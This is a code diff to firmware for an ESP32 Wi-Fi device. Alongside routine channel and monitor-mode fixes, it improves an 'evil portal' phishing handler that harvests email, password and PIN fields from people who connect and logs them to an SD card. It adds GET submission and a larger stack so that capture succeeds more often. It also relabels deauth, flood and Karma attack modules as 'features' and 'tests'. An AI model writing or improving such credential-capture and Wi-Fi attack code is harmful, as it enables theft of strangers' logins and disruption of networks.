@@ -77,15 +77,15 @@
 #include "mbedtls/private/hmac_drbg.h"
 #include "mbedtls/private/bignum.h"
 #include "core/serial_manager.h"
-#include "attacks/wifi/deauth_attack.h"
-#include "attacks/wifi/beacon_spam.h"
-#include "attacks/wifi/eapol_logoff.h"
-#include "attacks/wifi/sae_flood.h"
-#include "attacks/wifi/channel_switch_attack.h"
-#include "attacks/wifi/gtk_abuse.h"
-#include "attacks/wifi/probe_request_flood.h"
-#include "attacks/wifi/bad_msg.h"
-#include "attacks/wifi/auth_flood.h"
+#include "features/wifi/reconnect_test.h"
+#include "features/wifi/beacon_spam.h"
+#include "features/wifi/eapol_logoff.h"
+#include "features/wifi/sae_flood.h"
+#include "features/wifi/channel_switch_test.h"
+#include "features/wifi/gtk_abuse.h"
+#include "features/wifi/probe_request_flood.h"
+#include "features/wifi/bad_msg.h"
+#include "features/wifi/auth_flood.h"
 #include "scans/wifi/ap_scan.h"
 #include "scans/wifi/airspace_monitor.h"
 #include "scans/wifi/station_scan.h"
@@ -101,12 +101,6 @@ void music_visualizer_view_update(const uint8_t *amplitudes,
 #define CHUNK_SIZE 4096
 #define MDNS_NAME_BUF_LEN 65
 #define ARP_DELAY_MS 500
-
-// Persistent mDNS result storage (heap-allocated)
-static mdns_device_t *g_mdns_results = NULL;
-static int g_mdns_result_count = 0;
-static volatile bool g_mdns_scan_running = false;
-static volatile bool g_mdns_scan_done = false;
 
 #define BEACON_LIST_MAX 16
 #define BEACON_SSID_MAX_LEN 32
@@ -665,24 +659,6 @@ size_t wireshark_channels_count = 0;
 // Helper function forward declaration
 static void sanitize_ssid_and_check_hidden(const uint8_t* input_ssid, char* output_buffer, size_t buffer_size);
 
-struct service_info {
-    const char *query;
-    const char *type;
-};
-
-// Store in flash: const ensures this large-ish static table is placed in .rodata
-static const struct service_info services[] = {{"_http", "Web Server Enabled Device"},
-                                              {"_ssh", "SSH Server"},
-                                              {"_ipp", "Printer (IPP)"},
-                                              {"_googlecast", "Google Cast"},
-                                              {"_raop", "AirPlay"},
-                                              {"_smb", "SMB File Sharing"},
-                                              {"_hap", "HomeKit Accessory"},
-                                              {"_spotify-connect", "Spotify Connect Device"},
-                                              {"_printer", "Printer (Generic)"},
-                                              {"_mqtt", "MQTT Broker"}};
-
-#define NUM_SERVICES (sizeof(services) / sizeof(services[0]))
 
 struct DeviceInfo {
     struct ip4_addr ip;
@@ -1608,30 +1584,35 @@ esp_err_t get_info_handler(httpd_req_t *req) {
     }
 
     if (query[0] != '\0') {
-        // Extract known fields first
-        char val_buf[128] = {0};
-        if (get_query_param_value(query, "email", val_buf, sizeof(val_buf)) == ESP_OK) {
-            url_decode(decoded_email, val_buf);
-        }
-        if (get_query_param_value(query, "password", val_buf, sizeof(val_buf)) == ESP_OK) {
-            url_decode(decoded_password, val_buf);
-        }
-        // Also try common alternative field names
-        if (decoded_email[0] == '\0') {
-            const char *email_keys[] = {"user", "username", "login", "account", "phone", NULL};
-            for (int i = 0; email_keys[i] != NULL; i++) {
-                if (get_query_param_value(query, email_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
-                    url_decode(decoded_email, val_buf);
-                    if (decoded_email[0] != '\0') break;
+        // Extract known fields first.  Scoped so val_buf's stack slot is free
+        // for reuse below -- this handler runs close to the httpd worker's
+        // stack limit (same class of issue as the dns_server.c sinkhole/
+        // portal split).
+        {
+            char val_buf[128] = {0};
+            if (get_query_param_value(query, "email", val_buf, sizeof(val_buf)) == ESP_OK) {
+                url_decode(decoded_email, val_buf);
+            }
+            if (get_query_param_value(query, "password", val_buf, sizeof(val_buf)) == ESP_OK) {
+                url_decode(decoded_password, val_buf);
+            }
+            // Also try common alternative field names
+            if (decoded_email[0] == '\0') {
+                const char *email_keys[] = {"user", "username", "login", "account", "phone", NULL};
+                for (int i = 0; email_keys[i] != NULL; i++) {
+                    if (get_query_param_value(query, email_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                        url_decode(decoded_email, val_buf);
+                        if (decoded_email[0] != '\0') break;
+                    }
                 }
             }
-        }
-        if (decoded_password[0] == '\0') {
-            const char *pass_keys[] = {"pass", "passwd", "pin", NULL};
-            for (int i = 0; pass_keys[i] != NULL; i++) {
-                if (get_query_param_value(query, pass_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
-                    url_decode(decoded_password, val_buf);
-                    if (decoded_password[0] != '\0') break;
+            if (decoded_password[0] == '\0') {
+                const char *pass_keys[] = {"pass", "passwd", "pin", NULL};
+                for (int i = 0; pass_keys[i] != NULL; i++) {
+                    if (get_query_param_value(query, pass_keys[i], val_buf, sizeof(val_buf)) == ESP_OK) {
+                        url_decode(decoded_password, val_buf);
+                        if (decoded_password[0] != '\0') break;
+                    }
                 }
             }
         }
@@ -1669,17 +1650,21 @@ esp_err_t get_info_handler(httpd_req_t *req) {
             p = amp ? amp + 1 : p + strlen(p);
         }
 
-        // Write to credentials file
+        // Write to credentials file.  `query` is dead past this point (the
+        // dump loop above was its last reader), so reuse its storage instead
+        // of a fresh 512-byte `line` array -- keeps this handler's frame
+        // smaller on the httpd worker's tight stack.
         if (current_creds_filename[0] != '\0') {
-            char line[512];
+            char *line = query;
+            const size_t line_sz = sizeof(query);  // `line` is a pointer now; sizeof(line) would be wrong
             int n;
             if (decoded_email[0] != '\0' || decoded_password[0] != '\0') {
-                n = snprintf(line, sizeof(line), "Email: %s, Password: %s | All: %s\n",
+                n = snprintf(line, line_sz, "Email: %s, Password: %s | All: %s\n",
                              decoded_email, decoded_password, all_fields);
             } else {
-                n = snprintf(line, sizeof(line), "Fields: %s\n", all_fields);
+                n = snprintf(line, line_sz, "Fields: %s\n", all_fields);
             }
-            if (n > 0 && (size_t)n < sizeof(line)) {
+            if (n > 0 && (size_t)n < line_sz) {
                 if (!require_jit) {
                     if (sd_card_manager.is_initialized) {
                         FILE *f = fopen(current_creds_filename, "a");
@@ -1855,14 +1840,18 @@ httpd_handle_t start_portal_webserver(void) {
     }
 
     httpd_config_t config = HTTPD_DEFAULT_CONFIG();
-    config.max_uri_handlers = 32;
+    config.max_uri_handlers = 40; // headroom: currently 32 handlers registered; registration failures are unchecked
     config.max_open_sockets = 13; // Increased from 7
     config.backlog_conn = 10;     // Increased from 7
     config.server_port = 80;
     // ctrl_port must be unique across all httpd instances (ap_manager uses 32768)
     config.ctrl_port = 32769;
     config.lru_purge_enable = true;
-    config.stack_size = 4096;
+    // get_info_handler (credential capture) walks query/body parsing plus a
+    // direct fopen/fwrite/fclose on non-JIT boards; 4096 left too little
+    // headroom and could overflow the httpd worker stack right as creds were
+    // captured. Start a bit larger and only shrink if RAM forces it.
+    config.stack_size = 5120;
     // Short socket timeouts so a flooded or stalled client cannot pin a socket
     // for long.  These apply to the portal server only.
     config.recv_wait_timeout = 3;
@@ -1878,10 +1867,10 @@ httpd_handle_t start_portal_webserver(void) {
         config.ctrl_port = 32769 + ctrl_try;
         ret = httpd_start(&evilportal_server, &config);
 
-        if (ret == ESP_ERR_HTTPD_TASK && config.stack_size > 3072) {
+        while (ret == ESP_ERR_HTTPD_TASK && config.stack_size > 3072) {
             ESP_LOGW(TAG, "portal httpd_start failed with ESP_ERR_HTTPD_TASK, retrying with smaller stack");
             portal_log_heap_caps("start_failed_httpd_task");
-            config.stack_size = 3072;
+            config.stack_size = (config.stack_size > 4096) ? 4096 : 3072;
             vTaskDelay(pdMS_TO_TICKS(50));
             ret = httpd_start(&evilportal_server, &config);
         }
@@ -1926,6 +1915,11 @@ httpd_handle_t start_portal_webserver(void) {
             .uri = "/api/log", .method = HTTP_POST, .handler = get_log_handler, .user_ctx = NULL};
         httpd_uri_t get_handler_post = {
             .uri = "/get", .method = HTTP_POST, .handler = get_info_handler, .user_ctx = NULL};
+        // Many portal forms (including custom HTML on SD) omit method=, so
+        // browsers submit them as GET. Accept GET too; get_info_handler already
+        // parses both the query string and the POST body.
+        httpd_uri_t get_handler_get = {
+            .uri = "/get", .method = HTTP_GET, .handler = get_info_handler, .user_ctx = NULL};
         httpd_uri_t portal_png = {
             .uri = ".png", .method = HTTP_GET, .handler = file_handler, .user_ctx = NULL};
         httpd_uri_t portal_jpg = {
@@ -1962,6 +1956,7 @@ httpd_handle_t start_portal_webserver(void) {
         httpd_register_uri_handler(evilportal_server, &portal_uri);
         httpd_register_uri_handler(evilportal_server, &log_handler_uri);
         httpd_register_uri_handler(evilportal_server, &get_handler_post);
+        httpd_register_uri_handler(evilportal_server, &get_handler_get);
 
         httpd_register_uri_handler(evilportal_server, &portal_png);
         httpd_register_uri_handler(evilportal_server, &portal_jpg);
@@ -2183,7 +2178,15 @@ esp_err_t wifi_manager_start_evil_portal(const char *URLorFilePath, const char *
     esp_wifi_set_ps(WIFI_PS_NONE);
 
     // be conservative for client compatibility (2.4GHz only, HT20 for max compatibility)
+#if defined(CONFIG_IDF_TARGET_ESP32C5)
+    wifi_bandwidths_t bandwidths = {
+        .ghz_2g = WIFI_BW20,
+        .ghz_5g = WIFI_BW20,
+    };
+    (void)esp_wifi_set_bandwidths(WIFI_IF_AP, &bandwidths);
+#else
     (void)esp_wifi_set_bandwidth(WIFI_IF_AP, WIFI_BW20);
+#endif
     (void)esp_wifi_set_protocol(WIFI_IF_AP, WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N);
     dnsserver.ip.u_addr.ip4.addr = esp_ip4addr_aton("192.168.4.1");
     dnsserver.ip.type = ESP_IPADDR_TYPE_V4;
@@ -2339,6 +2342,23 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
     ESP_ERROR_CHECK(esp_wifi_set_mode(WIFI_MODE_STA));
     ESP_ERROR_CHECK(esp_wifi_start());
 
+#if defined(CONFIG_IDF_TARGET_ESP32C5)
+    // C5 AUTO band mode requires the multi-band APIs. Keep monitor PHY
+    // settings valid for both 2.4 GHz and 5 GHz receive-only capture.
+    wifi_bandwidths_t monitor_bandwidths = {
+        .ghz_2g = WIFI_BW20,
+        .ghz_5g = WIFI_BW20,
+    };
+    ESP_ERROR_CHECK(esp_wifi_set_bandwidths(WIFI_IF_STA, &monitor_bandwidths));
+    wifi_protocols_t monitor_protocols = {
+        .ghz_2g = WIFI_PROTOCOL_11B | WIFI_PROTOCOL_11G | WIFI_PROTOCOL_11N |
+                  WIFI_PROTOCOL_LR,
+        .ghz_5g = WIFI_PROTOCOL_11A | WIFI_PROTOCOL_11N |
+                  WIFI_PROTOCOL_11AC | WIFI_PROTOCOL_11AX,
+    };
+    ESP_ERROR_CHECK(esp_wifi_set_protocols(WIFI_IF_STA, &monitor_protocols));
+#endif
+
     // Disconnect STA if connected — an associated STA locks the radio to the
     // AP's channel, causing esp_wifi_set_channel() to fail (ESP_FAIL) and
     // preventing channel hopping (e.g. wardriving only sees one channel).
@@ -2364,12 +2384,28 @@ void wifi_manager_start_monitor_mode(wifi_promiscuous_cb_t_t callback) {
         // tracking needs MGMT (AP beacons) + DATA (active stations);
         // CTRL frames carry no usable RSSI targets, so leave them out.
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
+    } else if (callback == wifi_raw_scan_callback || callback == wifi_airspace_monitor_callback) {
+        /* Ask for individual MPDUs rather than whole A-MPDUs. An aggregate can
+         * run to tens of kilobytes, which no per-frame buffer can hold, and
+         * writing one blob as if it were a single frame produces garbage in
+         * Wireshark. Requesting MPDUs makes the driver split the aggregate for
+         * us, so every subframe is written as a normal, valid frame. */
+        filter.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA |
+                             WIFI_PROMIS_FILTER_MASK_CTRL | WIFI_PROMIS_FILTER_MASK_DATA_MPDU;
     } else {
-        // Default: capture all frame types (for raw capture, SAE flood, etc.)
+        // Default: capture all frame types (for SAE flood, etc.)
         filter.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL;
     }
     
     ESP_ERROR_CHECK(esp_wifi_set_promiscuous_filter(&filter));
+    if (callback == wifi_raw_scan_callback || callback == wifi_airspace_monitor_callback) {
+        // The category mask alone does not enable control subtypes: IDF's
+        // subtype mask defaults to zero. Include ACK/CTS/RTS/Block Ack in raw.
+        wifi_promiscuous_filter_t ctrl_filter = {
+            .filter_mask = WIFI_PROMIS_CTRL_FILTER_MASK_ALL,
+        };
+        ESP_ERROR_CHECK(esp_wifi_set_promiscuous_ctrl_filter(&ctrl_filter));
+    }
     ESP_LOGI("WIFI_MANAGER", "Set hardware filter mask: 0x%02" PRIx32, filter.filter_mask);
 
     // Backing store for handshake/probe/beacon/WPS/wardrive tables (~5KB).
@@ -3634,7 +3670,11 @@ static esp_err_t start_live_ap_channel_hopping(void) {
 
     // User hop profile overrides the compile-time live AP table.
     size_t profile_count = 0;
-    hop_profile_resolve(live_ap_profile_channels, WIFI_CHANNELS_MAX, &profile_count);
+    hop_profile_resolve_monitor(live_ap_profile_channels, WIFI_CHANNELS_MAX, &profile_count);
+    if (profile_count == 0) {
+        profile_count = wifi_channels_build_country_list(
+            live_ap_profile_channels, WIFI_CHANNELS_MAX);
+    }
     if (profile_count > 0) {
         live_ap_active_channels = live_ap_profile_channels;
         live_ap_active_channels_len = profile_count;
@@ -3644,7 +3684,11 @@ static esp_err_t start_live_ap_channel_hopping(void) {
     }
 
     live_ap_channel_index = 0;
-    esp_wifi_set_channel(live_ap_active_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
+    esp_err_t channel_err = esp_wifi_set_channel(
+        live_ap_active_channels[live_ap_channel_index], WIFI_SECOND_CHAN_NONE);
+    if (channel_err != ESP_OK) {
+        return channel_err;
+    }
     esp_timer_create_args_t timer_args = {
         .callback = live_ap_channel_hop_timer_callback,
         .name = "live_ap_hop"
@@ -3819,7 +3863,7 @@ void wifi_manager_start_live_ap_scan(void) {
     TERMINAL_VIEW_ADD_TEXT("Live AP scan started.\n");
 }
 
-// Beacon spam functions are now in attacks/wifi/beacon_spam.c
+// Beacon spam functions are now in features/wifi/beacon_spam.c
 // Wrapper functions to maintain API compatibility
 
 esp_err_t wifi_manager_broadcast_ap(const char *ssid) {
@@ -3830,163 +3874,6 @@ void wifi_manager_stop_beacon() {
     beacon_spam_stop();
 }
 
-void wifi_manager_start_ip_lookup() {
-    wifi_ap_record_t ap_info;
-    if (esp_wifi_sta_get_ap_info(&ap_info) != ESP_OK || ap_info.rssi == 0) {
-        printf("Not connected to an Access Point.\n");
-        return;
-    }
-
-    g_mdns_result_count = 0;
-    bool store_results = (g_mdns_results != NULL);
-    bool was_running = g_mdns_scan_running;
-    g_mdns_scan_running = true;
-
-    esp_netif_ip_info_t ip_info;
-    if (esp_netif_get_ip_info(esp_netif_get_handle_from_ifkey("WIFI_STA_DEF"), &ip_info) ==
-        ESP_OK) {
-        printf("Connected. Proceeding with IP lookup...\n");
-
-        for (int s = 0; s < NUM_SERVICES; s++) {
-            if (!g_mdns_scan_running) break;
-
-            int retries = 0;
-            mdns_result_t *mdnsresult = NULL;
-
-            while (retries < 5 && mdnsresult == NULL && g_mdns_scan_running) {
-                mdns_query_ptr(services[s].query, "_tcp", 2000, 30, &mdnsresult);
-                if (mdnsresult == NULL) {
-                    retries++;
-                    printf("Retrying mDNS query for service: %s (Attempt %d)\n",
-                           services[s].query, retries);
-                    vTaskDelay(pdMS_TO_TICKS(500));
-                }
-            }
-
-            if (mdnsresult != NULL) {
-                printf("mDNS query succeeded for service: %s\n", services[s].query);
-
-                mdns_result_t *current_result = mdnsresult;
-                while (current_result != NULL) {
-                    char ip_str[INET_ADDRSTRLEN] = {0};
-                    mdns_ip_addr_t *addr_item = current_result->addr;
-                    bool has_v4 = false;
-                    while (addr_item != NULL) {
-                        if (addr_item->addr.type == IPADDR_TYPE_V4) {
-                            inet_ntop(AF_INET, &addr_item->addr.u_addr.ip4, ip_str, INET_ADDRSTRLEN);
-                            has_v4 = true;
-                            break;
-                        }
-                        addr_item = addr_item->next;
-                    }
-                    if (!has_v4) {
-                        strncpy(ip_str, "0.0.0.0", sizeof(ip_str));
-                    }
-
-                    if (store_results && g_mdns_result_count < MDNS_MAX_DEVICES) {
-                        bool duplicate = false;
-                        for (int d = 0; d < g_mdns_result_count; d++) {
-                            if (strcmp(g_mdns_results[d].ip, ip_str) == 0) {
-                                duplicate = true;
-                                break;
-                            }
-                        }
-                        if (!duplicate) {
-                            mdns_device_t *dev = &g_mdns_results[g_mdns_result_count];
-                            memset(dev, 0, sizeof(mdns_device_t));
-                            if (current_result->hostname) {
-                                strncpy(dev->hostname, current_result->hostname, sizeof(dev->hostname) - 1);
-                            }
-                            strncpy(dev->ip, ip_str, sizeof(dev->ip) - 1);
-                            dev->port = current_result->port;
-                            strncpy(dev->service_type, services[s].type, sizeof(dev->service_type) - 1);
-                            g_mdns_result_count++;
-                        }
-                    }
-
-                    printf("Device at: %s\n", ip_str);
-                    printf("  Name: %s\n", current_result->hostname);
-                    printf("  Type: %s\n", services[s].type);
-                    printf("  Port: %u\n", current_result->port);
-
-                    current_result = current_result->next;
-                }
-
-                mdns_query_results_free(mdnsresult);
-            } else {
-                printf("Failed to find devices for service: %s after %d retries\n",
-                       services[s].query, retries);
-            }
-        }
-    } else {
-        printf("Can't get network interface info.\n");
-    }
-
-    printf("IP Scan Done. Found %d devices.\n", g_mdns_result_count);
-    if (!was_running) {
-        g_mdns_scan_running = false;
-    }
-}
-
-static void wifi_manager_ip_lookup_task(void *pvParameters) {
-    (void)pvParameters;
-    wifi_manager_start_ip_lookup();
-    g_mdns_scan_done = true;
-    vTaskDelete(NULL);
-}
-
-esp_err_t wifi_manager_start_ip_lookup_async(void) {
-    if (g_mdns_scan_running) {
-        return ESP_ERR_INVALID_STATE;
-    }
-    wifi_manager_ip_lookup_clear();
-    g_mdns_results = malloc(sizeof(mdns_device_t) * MDNS_MAX_DEVICES);
-    if (!g_mdns_results) {
-        return ESP_ERR_NO_MEM;
-    }
-    memset(g_mdns_results, 0, sizeof(mdns_device_t) * MDNS_MAX_DEVICES);
-    g_mdns_scan_running = true;
-    g_mdns_scan_done = false;
-    BaseType_t ret = xTaskCreate(wifi_manager_ip_lookup_task, "mdns_scan", 8192, NULL, 5, NULL);
-    if (ret != pdPASS) {
-        g_mdns_scan_running = false;
-        free(g_mdns_results);
-        g_mdns_results = NULL;
-        return ESP_FAIL;
-    }
-    return ESP_OK;
-}
-
-bool wifi_manager_ip_lookup_check_done(void) {
-    return g_mdns_scan_done;
-}
-
-void wifi_manager_ip_lookup_finish_async(void) {
-    g_mdns_scan_running = false;
-}
-
-bool wifi_manager_ip_lookup_is_running(void) {
-    return g_mdns_scan_running && !g_mdns_scan_done;
-}
-
-int wifi_manager_ip_lookup_get_count(void) {
-    return g_mdns_result_count;
-}
-
-const mdns_device_t* wifi_manager_ip_lookup_get_device(int index) {
-    if (index < 0 || index >= g_mdns_result_count) {
-        return NULL;
-    }
-    return &g_mdns_results[index];
-}
-
-void wifi_manager_ip_lookup_clear(void) {
-    g_mdns_result_count = 0;
-    if (g_mdns_results) {
-        free(g_mdns_results);
-        g_mdns_results = NULL;
-    }
-}
 void wifi_manager_connect_wifi(const char *ssid, const char *password) {
     if (ssid == NULL || ssid[0] == '\0') {
         printf("No SSID provided\n");
@@ -4230,7 +4117,7 @@ esp_err_t wifi_manager_start_scan_with_time(int seconds) {
     // of the driver's all-country-channel sweep.
     uint8_t profile_channels[WIFI_CHANNELS_MAX];
     size_t profile_count = 0;
-    hop_profile_resolve(profile_channels, WIFI_CHANNELS_MAX, &profile_count);
+    hop_profile_resolve_monitor(profile_channels, WIFI_CHANNELS_MAX, &profile_count);
     if (profile_count > 0) {
         printf("WiFi Scan started (%u channels)\n", (unsigned)profile_count);
         TERMINAL_VIEW_ADD_TEXT("WiFi Scan started\n");
@@ -4283,17 +4170,13 @@ static void wireshark_channel_hop_timer_callback(void *arg) {
     wireshark_channel_index = (wireshark_channel_index + 1) % wireshark_channels_count;
     uint8_t channel = wireshark_channels[wireshark_channel_index];
     
-    // determine if 5ghz or 2.4ghz
+    // Monitor mode is configured at 20 MHz for the C5; never request HT40 here.
     wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
-    
-    #if defined(CONFIG_IDF_TARGET_ESP32C5)
-    if (channel > 14) {
-        // 5ghz channel - use ht40
-        second = WIFI_SECOND_CHAN_ABOVE;
+    esp_err_t channel_err = esp_wifi_set_channel(channel, second);
+    if (channel_err != ESP_OK) {
+        ESP_LOGW(TAG, "Failed to hop Wireshark channel %u: %s",
+                 (unsigned)channel, esp_err_to_name(channel_err));
     }
-    #endif
-    
-    esp_wifi_set_channel(channel, second);
 }
 
 static bool callback_uses_selected_ap_capture_plan(wifi_promiscuous_cb_t_t callback) {
@@ -4339,7 +4222,7 @@ static void apply_selected_ap_capture_channel_plan(wifi_promiscuous_cb_t_t callb
     int unique_count = 0;
     for (int i = 0; i < selected_ap_count && unique_count < (int)(sizeof(unique_channels) / sizeof(unique_channels[0])); i++) {
         uint8_t channel = selected_aps[i].primary;
-        if (channel == 0) {
+        if (!wifi_channels_is_monitor_channel(channel)) {
             continue;
         }
 
@@ -4374,13 +4257,16 @@ static void apply_selected_ap_capture_channel_plan(wifi_promiscuous_cb_t_t callb
     wireshark_channels_count = (size_t)unique_count;
     wireshark_channel_index = 0;
 
+    // Monitor mode is configured at 20 MHz for the C5; never request HT40.
     wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    if (wireshark_channels[0] > 14) {
-        second = WIFI_SECOND_CHAN_ABOVE;
+    esp_err_t selected_channel_err = esp_wifi_set_channel(
+        wireshark_channels[0], second);
+    if (selected_channel_err != ESP_OK) {
+        ESP_LOGE(TAG, "Failed to set selected capture channel %u: %s",
+                 (unsigned)wireshark_channels[0],
+                 esp_err_to_name(selected_channel_err));
+        return;
     }
-#endif
-    esp_wifi_set_channel(wireshark_channels[0], second);
 
     esp_timer_create_args_t timer_args = {
         .callback = wireshark_channel_hop_timer_callback,
@@ -4415,7 +4301,7 @@ esp_err_t wifi_manager_start_wireshark_channel_list(const uint8_t *channels, siz
     uint8_t unique[sizeof(wireshark_channels)] = {0};
     size_t unique_count = 0;
     for (size_t i = 0; i < count; i++) {
-        if (channels[i] < 1 || channels[i] > MAX_WIFI_CHANNEL) return ESP_ERR_INVALID_ARG;
+        if (!wifi_channels_is_monitor_channel(channels[i])) return ESP_ERR_INVALID_ARG;
         bool seen = false;
         for (size_t j = 0; j < unique_count; j++) {
             if (unique[j] == channels[i]) {
@@ -4438,10 +4324,8 @@ esp_err_t wifi_manager_start_wireshark_channel_list(const uint8_t *channels, siz
     wireshark_channels_count = unique_count;
     wireshark_channel_index = 0;
 
+    // Monitor mode is configured at 20 MHz for the C5; never request HT40.
     wifi_second_chan_t second = WIFI_SECOND_CHAN_NONE;
-#if defined(CONFIG_IDF_TARGET_ESP32C5)
-    if (wireshark_channels[0] > 14) second = WIFI_SECOND_CHAN_ABOVE;
-#endif
     esp_err_t err = esp_wifi_set_channel(wireshark_channels[0], second);
     if (err != ESP_OK) return err;
 
@@ -4469,7 +4353,7 @@ void wifi_manager_start_wireshark_channel_hop(void) {
 
     // Use the user hop profile when one is selected; otherwise keep the
     // historical country-appropriate channel list.
-    hop_profile_resolve(channels, sizeof(channels), &count);
+    hop_profile_resolve_monitor(channels, sizeof(channels), &count);
     if (count == 0) {
         // HOP_MODE_DEFAULT (or nothing configured): country list.
         count = wifi_channels_build_country_list(channels, sizeof(channels));
@@ -4494,11 +4378,8 @@ void wifi_manager_stop_wireshark_channel_hop(void) {
 }
 
 esp_err_t wifi_manager_set_wireshark_fixed_channel(uint8_t channel) {
-    // Validate channel range based on target
-    uint8_t max_channel = MAX_WIFI_CHANNEL;
-
-    if (channel < 1 || channel > max_channel) {
-        ESP_LOGE(TAG, "Invalid channel %d. Must be between 1 and %d", channel, max_channel);
+    if (!wifi_channels_is_monitor_channel(channel)) {
+        ESP_LOGE(TAG, "Invalid or country-disallowed monitor channel %d", channel);
         return ESP_ERR_INVALID_ARG;
     }
 
@@ -4517,11 +4398,8 @@ esp_err_t wifi_manager_set_wireshark_fixed_channel(uint8_t channel) {
 }
 
 esp_err_t wifi_manager_set_capture_channel_lock(uint8_t channel) {
-    // Validate channel range based on target
-    uint8_t max_channel = MAX_WIFI_CHANNEL;
-
-    if (channel < 1 || channel > max_channel) {
-        ESP_LOGE(TAG, "Invalid capture channel %d. Must be between 1 and %d", channel, max_channel);
+    if (!wifi_channels_is_monitor_channel(channel)) {
+        ESP_LOGE(TAG, "Invalid or country-disallowed capture channel %d", channel);
         return ESP_ERR_INVALID_ARG;
     }
 
@@ -5029,8 +4907,8 @@ static void karma_stop_portal_if_active(void) {
 }
 
 static void karma_task(void *param) {
-    printf("Karma attack started\n");
-    TERMINAL_VIEW_ADD_TEXT("Karma attack started\n");
+    printf("Karma test started\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma test started\n");
 
     // Enable promiscuous mode for capturing probe requests
     wifi_promiscuous_filter_t filter = { .filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT };
@@ -5111,14 +4989,14 @@ static void karma_task(void *param) {
     esp_wifi_set_promiscuous(false);
     karma_stop_portal_if_active();
     karma_task_handle = NULL;
-    printf("Karma attack stopped\n");
-    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
+    printf("Karma test stopped\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma test stopped\n");
     vTaskDelete(NULL);
 }
 void wifi_manager_start_karma(void) {
     if (karma_running) {
-        printf("Karma attack already running\n");
-        TERMINAL_VIEW_ADD_TEXT("Karma attack already running\n");
+        printf("Karma test already running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma test already running\n");
         return;
     }
     if (!karma_ssid_manual_mode) {
@@ -5138,8 +5016,8 @@ void wifi_manager_start_karma(void) {
 
 void wifi_manager_stop_karma(void) {
     if (!karma_running) {
-        printf("Karma attack not running\n");
-        TERMINAL_VIEW_ADD_TEXT("Karma attack not running\n");
+        printf("Karma test not running\n");
+        TERMINAL_VIEW_ADD_TEXT("Karma test not running\n");
         return;
     }
     karma_running = false;
@@ -5159,8 +5037,8 @@ void wifi_manager_stop_karma(void) {
         vTaskDelete(karma_task_handle);
         karma_task_handle = NULL;
     }
-    printf("Karma attack stopped\n");
-    TERMINAL_VIEW_ADD_TEXT("Karma attack stopped\n");
+    printf("Karma test stopped\n");
+    TERMINAL_VIEW_ADD_TEXT("Karma test stopped\n");
 }
 
 bool wifi_manager_karma_is_running(void) {
@@ -5170,6 +5048,10 @@ bool wifi_manager_karma_is_running(void) {
 // rssi tracking for selected ap and sta
 static volatile bool ap_tracking_active = false;
 static volatile bool sta_tracking_active = false;
+// When set, track any MGMT/DATA frame carrying the target MAC in addr1/2/3,
+// not just its beacons -- needed for promiscuous-detected devices (cameras,
+// clients) that are not the AP beaconing on their own BSSID.
+static volatile bool track_any_frame = false;
 static int8_t tracking_last_rssi = 0;
 static int8_t tracking_min_rssi = 0;
 static int8_t tracking_max_rssi = -127;
@@ -5208,11 +5090,18 @@ static void wifi_track_callback(void *buf, wifi_promiscuous_pkt_type_t type) {
     bool match = false;
 
     if (ap_tracking_active && strlen((const char *)selected_ap.ssid) > 0) {
-        // APs: beacons only (periodic, consistent rate/power). Probe
-        // responses and other MGMT at varying rates would add jitter.
-        // addr2 carries the BSSID on beacons.
-        if (is_mgmt && (hdr->frame_ctrl & WIFI_FC_TYPE_SUBTYPE_MASK) == WIFI_FC_BEACON &&
-            memcmp(hdr->addr2, selected_ap.bssid, 6) == 0) {
+        if (track_any_frame) {
+            // Any frame that carries the target MAC, either direction.
+            if (memcmp(hdr->addr1, selected_ap.bssid, 6) == 0 ||
+                memcmp(hdr->addr2, selected_ap.bssid, 6) == 0 ||
+                memcmp(hdr->addr3, selected_ap.bssid, 6) == 0) {
+                match = true;
+            }
+        } else if (is_mgmt && (hdr->frame_ctrl & WIFI_FC_TYPE_SUBTYPE_MASK) == WIFI_FC_BEACON &&
+                   memcmp(hdr->addr2, selected_ap.bssid, 6) == 0) {
+            // APs: beacons only (periodic, consistent rate/power). Probe
+            // responses and other MGMT at varying rates would add jitter.
+            // addr2 carries the BSSID on beacons.
             match = true;
         }
     }
@@ -5300,6 +5189,7 @@ void wifi_manager_track_ap(void) {
     tracking_last_rx_us = esp_timer_get_time();
     ap_tracking_active = true;
     sta_tracking_active = false;
+    track_any_frame = false;
     
     // set channel to ap's channel
     esp_wifi_set_channel(selected_ap.primary, WIFI_SECOND_CHAN_NONE);
@@ -5339,10 +5229,38 @@ void wifi_manager_track_sta(void) {
     tracking_last_rx_us = 0; // no station packet seen yet
     ap_tracking_active = false;
     sta_tracking_active = true;
+    track_any_frame = false;
     
     esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
     
     status_display_show_status("Track STA");
+    wifi_manager_start_monitor_mode(wifi_track_callback);
+}
+
+// Track an arbitrary BSSID directly, with no ap_scan entry required -- used to
+// track surveillance-camera/sniffer hits found by promiscuous scanning. The AP
+// fast path matches on selected_ap and reports its SSID, so a non-empty label
+// is stored there.
+void wifi_manager_track_bssid(const uint8_t bssid[6], uint8_t channel, const char *label) {
+    memcpy(selected_ap.bssid, bssid, 6);
+    selected_ap.primary = channel;
+    selected_ap.rssi = -100;
+    const char *nm = (label && label[0]) ? label : "tracked";
+    strncpy((char *)selected_ap.ssid, nm, sizeof(selected_ap.ssid) - 1);
+    selected_ap.ssid[sizeof(selected_ap.ssid) - 1] = '\0';
+
+    tracking_last_rssi = -100;
+    tracking_min_rssi = -100;
+    tracking_max_rssi = -127;
